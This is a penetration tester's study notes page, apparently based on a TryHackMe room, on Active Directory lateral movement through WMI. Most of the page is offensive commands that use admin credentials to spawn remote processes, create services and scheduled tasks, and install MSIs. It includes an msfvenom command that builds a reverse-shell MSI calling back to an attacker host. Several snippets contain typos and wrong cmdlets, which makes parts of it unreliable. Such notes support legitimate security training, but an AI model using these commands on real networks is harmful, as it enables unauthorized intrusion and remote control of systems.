# AD Lateral Movement - WMI

Windows Management Instrumentation (WMI) is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices. Not to be confused with `wmic` see [[WMI-Commands]] for more uses of WMI's Command Line utility. Regardless WMI allows administrators to perform standard management tasks, therefore a utility to lateral movement. Windows Management Instrumentation ([WMI](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)), which is an object-oriented feature that facilitates task automation. WMI is capable of creating processes via the Create method from the `Win32_Process` class and then run a system service in [session 0](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361). It communicates through [Remote Procedure Calls](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738291(v=ws.10)?redirectedfrom=MSDN) (RPC) over port 135. [WMIC is deprecated as of Windows 10](https://learn.microsoft.com/en-us/windows/whats-new/deprecated-features), but is superseded by [Windows PowerShell for WMI](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi).

Is not restricted by UAC remote restrictions
```powershell
# Deprecated
#  As of Windows Vista, the WMI Provider host runs as a system service and therefore run in `session 0` to provide session isolation

wmic /node:$ipAddress /user:$user /password:$password process call create "cmd"
# PowerShell version 
# Create Credential Object
$username = '';
$password = '';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
# Pass credential object to Common Information Model (CIM) 
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $ipAddress -Credential $credential -SessionOption $Options 
$command = 'cmd';
# Invoke   
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

## Connecting to WMI From Powershell

-   **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
-   **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

Create a PSCredential object 
```powershell
$username = 'Administrator';
$password = 'admin';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```
Store sessions with `New-CimSessionOption` 
```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName <computer-name> -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

## Remote Process Creation Using WMI

**Requirements**
-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
-   **Group Memberships**: 
	- Administrators

Remotely spawn a process from Powershell by sending a WMI request to the Win32_process class to spawn the process under the session we previously created 
```powershell
$Command = "powershell.exe ..." # Enter a command here
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -arguments @{ CommandLine = $Command }
```
Output of command and processs create will both be silent. Legacy system can use `wmic.exe`:
```powershell
wmic.exe /user:Administrator /password:admin /node:<target computer name> process call create "cmd.exe /c <whatever tool you have on the target to connect back!>"
```

## Remote Service Creation Using WMI

**Requirements**
-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
-   **Group Memberships**: 
	- Administrators

Create a service with Powershell; Importantly `PathName` is your payload and the `ServiceType` completed below and is a `Win32OwnProcess` Starting a service in a new Process. The `Name` and `DisplayName` are just the naming of this services
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguements @{
Name = "";
DisplayName = "";
PathName = ""; 
ServiceType = [byte]::Parse("16");
StartMode = "Manual"
}
```
Use the service name to start like so:
```powershell
$Service = Get-CimInstance -CimSession $SEssion -ClassName Win32_SErvice -filter "Name LIKE '<service name>'" 

Invoke-CimMethod -InputObject $Service -MethodName StartService
# Stop and delte with the following:
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## Remote Scheduled Task Creation Using WMI

**Requirements**
-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
-   **Group Memberships**: 
	- Administrators

Create and execute a scheduled task:
```powershell
# Payload must split into Command and Args
$Command = ".exe"
$Arg = "arguments go here"
# Create the Scheduled Task
$Action = New-ScheduledTaskAction -CimSessions $Session -Execute $Command -Argument $Args
# Register it
Register-ScheduledTask -CimSession $Session -Action -$Action -User "NT AUTHORITY\SYSTEM" -TaskName "Taskname"
# Then Start
Start-ScheduleTask -CimSession $Session -TaskName "Taskname"
# Unregister to delete
Register-ScheduledTask -CimSession $Session -TaskName "Taskname"
```

## Installing MSI Packages Through WMI

**Requirements**
-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
-   **Group Memberships**: 
	- Administrators

MSI is file fpormat for installers, therefore copying a MSI package to a target system and using WMI to install it. With [[MSFVenom-Payloads]]:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$attack_ip LPORT=$port -f msi > badinstall.msi
```

Inoke the `Win32_Product` class through WMI:
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\$installer.msi"; Options = ""; AllUsers = $false}
```
Legacy system can use [[WMI-Commands]]:
```powershell
wmic /node:target_ip /user:$domain\$user product call install PackageLocation=C:\Window\$installer.msi
```


## References

[Lateral movement and pivoting THM Room](https://tryhackme.com/room/lateralmovementandpivoting)
[Microsoft - WMI](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)
[Microsoft - session 0](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361)
[Microsoft - Remote Procedure Calls](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738291(v=ws.10)?redirectedfrom=MSDN)
[Microsoft  WMIC deprecation](https://learn.microsoft.com/en-us/windows/whats-new/deprecated-features)
[Microsoft - Windows PowerShell for WMI](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi).